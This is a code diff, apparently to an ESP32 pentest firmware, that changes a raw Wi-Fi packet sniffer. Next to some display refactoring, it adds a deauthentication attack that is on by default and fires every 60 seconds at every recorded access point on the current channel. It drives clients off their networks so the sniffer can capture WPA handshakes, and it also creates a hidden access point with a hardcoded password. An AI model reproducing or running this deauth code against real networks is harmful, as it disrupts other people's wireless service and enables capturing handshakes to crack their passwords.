@@ -32,6 +32,7 @@
 	#include <SPI.h>
 	#include <SdFat.h>
 #endif
+#include "modules/wifi/wifi_atks.h" // to use deauth frames and cmds
 
 //===== SETTINGS =====//
 #define CHANNEL 1
@@ -322,13 +323,14 @@ void openFile(FS &Fs){
 //===== SETUP =====//
 void sniffer_setup() {
   FS* Fs;
-  drawMainBorder();
-  tft.setCursor(10, 26);
-  Serial.begin(115200);
-  //delay(2000);
-  Serial.println();
-  closeSdCard();
+  int redraw = true;
   String FileSys="LittleFS";
+  bool deauth=true;
+  bool deauth_tmp=0;
+  drawMainBorderWithTitle("RAW SNIFFER");
+
+  closeSdCard();
+  
   _only_HS=true; // default mode to start if it doesn't have SD Cadr
   if(setupSdCard()) {
     Fs = &SD; // if SD is present and mounted, start writing on SD Card
@@ -342,7 +344,7 @@ void sniffer_setup() {
   displaySomething("Sniffing Started");
   tft.setTextSize(FP);
   tft.setCursor(80, 100);
-  int redraw = true;
+  
   SavedHS.clear(); // Need to clear to restart HS count
   registeredBeacons.clear();
   /* setup wifi */
@@ -351,7 +353,23 @@ void sniffer_setup() {
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
   ESP_ERROR_CHECK( esp_wifi_init(&cfg) );
   ESP_ERROR_CHECK( esp_wifi_set_storage(WIFI_STORAGE_RAM) );
-  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_AP) );
+
+  wifi_config_t wifi_config = {
+    .ap = {
+        .ssid = "BruceSniffer",
+        .password = "brucenet",
+        .ssid_len = strlen("BruceSniffer"),
+        .channel = 1,                      // Canal da rede (1-13)
+        .authmode = WIFI_AUTH_WPA2_PSK,    // Modo de autenticação
+        .ssid_hidden = 1,                  // 1 para ocultar o SSID, 0 para visível
+        .max_connection = 2,               // Máximo de conexões simultâneas
+        .beacon_interval = 100,            // Intervalo do beacon em ms
+    },
+  };
+
+  // Configura o modo AP
+  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
   ESP_ERROR_CHECK( esp_wifi_start() );
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(sniffer);
@@ -365,7 +383,9 @@ void sniffer_setup() {
   num_EAPOL=0;
   num_HS=0;
   packet_counter=0;
-
+  deauth_tmp=millis();
+  // Prepare deauth frame for each AP record
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
   for(;;) {
     if (returnToMenu) { // if it happpend, liffle FS is full;
       Serial.println("Not enough space on LittleFS");
@@ -438,6 +458,7 @@ void sniffer_setup() {
               openFile(*Fs); //open new file
             }
           }},
+          {deauth?"Deauth->OFF":"Deauth->ON",      [&]()    { deauth=!deauth; }},
           {_only_HS?"All packets":"EAPOL/HS only", [=]()    { _only_HS=!_only_HS; }},
           {"Reset Counter", [=]()    { packet_counter=0; num_EAPOL=0; num_HS=0; }},
           {"Exit Sniffer", [=]()    { returnToMenu=true; }},
@@ -447,21 +468,13 @@ void sniffer_setup() {
       if(returnToMenu) goto Exit;
       redraw = false;
       tft.drawPixel(0,0,0);
-      drawMainBorder(); // Clear Screen and redraw border
+      drawMainBorderWithTitle("RAW SNIFFER"); // Clear Screen and redraw border
       tft.setTextSize(FP);
       tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-      tft.setCursor(10, 30);
-      tft.println("RAW SNIFFER");
-      tft.setCursor(10, 30);
-      tft.println("RAW SNIFFER");
-      tft.setCursor(10, tft.getCursorY()+3);
-      tft.println("Saved file into " + FileSys);
-      tft.setCursor(10, tft.getCursorY()+3);
-      tft.println("File: " + filename);
-      tft.setCursor(10, tft.getCursorY()+10);
-      tft.println("Sniffer Mode: " + String(_only_HS?"Only EAPOL/HS":"All packets Sniff"));
-      tft.setCursor(10, tft.getCursorY()+10);
-      tft.println(String(BTN_ALIAS) + ": Options Menu");
+      padprint("Saved file into " + FileSys);
+      padprint("File: " + filename);
+      padprint("Sniffer Mode: " + String(_only_HS?"Only EAPOL/HS":"All packets Sniff"));
+      padprint(String(BTN_ALIAS) + ": Options Menu");
       tft.drawRightString("Ch." + String(ch<10?"0":"") + String(ch) + "(Next)",WIDTH-10, HEIGHT-18,1);
     }
 
@@ -472,6 +485,20 @@ void sniffer_setup() {
       lastTime = currentTime; //update time
       tft.drawString("EAPOL: " + String(num_EAPOL) + " HS: " + String(num_HS),10,HEIGHT-18);
       tft.drawCentreString("Packets " + String(packet_counter),WIDTH/2, HEIGHT-26,1);
+    }
+
+    if(deauth && (millis()-deauth_tmp)>60000) { // deauths once every 60 seconds
+      if(registeredBeacons.size()>40) registeredBeacons.clear(); // Clear registered beacons to restart search and avoid restarts
+      Serial.println("<<---- Starting Deauthentication Process ---->>");
+      for(auto registeredBeacon:registeredBeacons) {
+        if(registeredBeacon.channel==ch) {
+          memcpy(&ap_record.bssid,registeredBeacon.MAC, 6);
+          wsl_bypasser_send_raw_frame(&ap_record,registeredBeacon.channel); //writes the buffer with the information
+          send_raw_frame(deauth_frame,26);
+          delay(2);
+        }
+      }
+      deauth_tmp=millis();
     }
 
     vTaskDelay(100/portTICK_PERIOD_MS);
